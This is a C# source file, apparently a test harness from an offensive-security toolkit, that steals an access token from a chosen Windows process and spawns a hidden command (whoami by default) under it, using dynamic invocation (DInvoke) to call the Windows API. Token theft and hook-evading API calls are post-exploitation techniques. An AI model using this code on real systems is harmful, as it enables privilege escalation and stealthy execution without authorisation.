using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace Win32Test
{
    internal class SpawnProcess
    {
        public static void Run(string[] args)
        {
            //var apitype = APIAccessType.PInvoke;
            var apitype = APIAccessType.DInvoke;

            Console.WriteLine($"[?] WinAPIAccess = {apitype}");

            if (args.Length < 2)
            {
                //Console.WriteLine("Usage : Win32Test.exe ProcessId cmd");
                //return;
                //args = new string[]
                //{
                //    "3668",
                //    @"c:\windows\system32\cmd.exe /c whoami"
                //};
            }


            string cmd = null;
            int? processId = null;

            if (args.Length == 0)
            {
                args = new string[]
               {
                        //@"c:\windows\system32\cmd.exe /c whoami"
                        @"c:\windows\system32\whoami.exe"
                };
                //processId = 3668;
            }

            

            if (args.Length == 1)
            {
                cmd = args[0];
            }
            else
            {
                if (!int.TryParse(args[0], out var pId))
                    throw new ArgumentException("Process is not valid!");
                cmd = args[1];
                processId = pId;
            }


            var wrapper = WinAPIWrapper.CreateInstance(apitype);

            IntPtr hToken = IntPtr.Zero;

            //steal the token

            if (processId.HasValue)
            {
                Console.WriteLine($"[>] Stealing Token from process {processId}...");
                hToken = wrapper.StealToken(processId.Value);
                Console.WriteLine($"[?] TokenHandle = {hToken}");
            }

            var creationParms = new ProcessCreationParameters()
            {
                //Application = cmd,
                Command = cmd,
                Token = hToken,
                RedirectOutput = true,
                CreateNoWindow = true,
            };

            Console.WriteLine($"[>] Executing {cmd}...");
            var procResult = wrapper.CreateProcess(creationParms);

            Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
            Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
            Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

            if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
            {
                Console.WriteLine("[+] Result :");
                wrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => Console.Write(output));
            }
        }
    }
}
